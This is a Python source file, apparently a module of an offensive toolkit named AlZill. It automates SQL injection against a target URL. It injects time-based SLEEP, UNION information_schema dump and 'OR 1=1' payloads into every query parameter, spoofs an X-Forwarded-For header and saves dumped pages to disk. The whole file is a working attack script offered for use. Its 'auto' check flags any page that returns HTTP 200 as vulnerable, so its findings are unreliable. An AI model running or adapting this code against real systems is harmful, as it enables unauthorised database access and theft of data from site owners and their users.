#!/usr/bin/env python3
"""
Advanced SQLi Exploiter - AlZill Module
"""

import re
import os
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode
from termcolor import cprint


class SQLiExploiter:
    """Advanced SQL Injection Exploitation Module"""
    
    def __init__(self, *args, **kwargs):
        """Initialize the exploiter (accepts any arguments for compatibility)"""
        pass
    
    def exploit(self, url, mode='auto', delay=1):
        """
        SQL Injection Exploitation Function
        
        Modes:
            - auto: Discovery & verification
            - dump: Systematic data extraction
            - time: Blind time-based verification
        """
        cprint(f"[SQLI] Target: {url}", "cyan")
        cprint(f"[SQLI] Mode: {mode.upper()}", "magenta")

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'X-Forwarded-For': '127.0.0.1'
        }

        # Parse URL and extract parameters
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        if not params:
            cprint("[!] No active parameters detected. Injecting 'id=1' as fallback...", "yellow")
            params = {'id': ['1']}

        # Define payloads based on operation mode
        if mode == 'time':
            payload = "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
        elif mode == 'dump':
            # Generic UNION payload to extract Database, User, and Table Names
            payload = "' UNION SELECT 1,group_concat(table_name),database(),user(),5,6 FROM information_schema.tables WHERE table_schema=database()--"
        else:
            # Generic bypass/discovery payload
            payload = "' OR 1=1--"

        # Iterate through each parameter for injection
        for param_name in params:
            cprint(f"[*] Testing vector: [{param_name}]", "blue")

            test_params = params.copy()
            test_params[param_name] = [payload]

            # Reconstruct URL with injected payload
            query_string = urlencode(test_params, doseq=True)
            target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"

            try:
                if delay > 0:
                    time.sleep(delay)

                start_time = time.time()
                response = requests.get(target_url, headers=headers, timeout=15)
                duration = time.time() - start_time

                # --- Analysis Logic ---

                # 1. Verify Time-Based Success
                if mode == 'time' and duration >= 5:
                    cprint(f"[!] SUCCESS: Time-based SQLi confirmed on '{param_name}'!", "green", attrs=['bold'])
                    return True

                # 2. Verify and Process Data Dump
                if mode == 'dump' and response.status_code == 200:
                    # Check for database structure indicators in response
                    indicators = ['information_schema', 'users', 'admin', 'password', 'schema_name']
                    if any(x in response.text.lower() for x in indicators):
                        cprint(f"[!] SUCCESS: Data exfiltration successful via '{param_name}'!", "green", attrs=['bold'])

                        # Ensure results directory exists
                        os.makedirs("results", exist_ok=True)
                        save_path = f"results/sql_dump_{int(time.time())}.html"

                        with open(save_path, "w", encoding="utf-8") as f:
                            f.write(response.text)

                        cprint(f" -> Output saved to: {save_path}", "cyan")
                        return True

                # 3. General Vulnerability Detection
                if response.status_code == 200 and mode == 'auto':
                    if "sql" in response.text.lower() or response.status_code == 200:
                        cprint(f"[+] Potential vulnerability confirmed on '{param_name}'", "green")
                        cprint(f" -> Vector: {target_url}", "cyan")

            except Exception as e:
                cprint(f"[X] Error executing vector {param_name}: {e}", "red")

        return False


# Legacy function for backward compatibility
def exploit(url, mode='auto', delay=1):
    """Legacy exploit function"""
    exploiter = SQLiExploiter()
    return exploiter.exploit(url, mode, delay)


# For direct execution
if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        exploit(sys.argv[1])
    else:
        print("Usage: python xploit_sqli.py <target_url>")
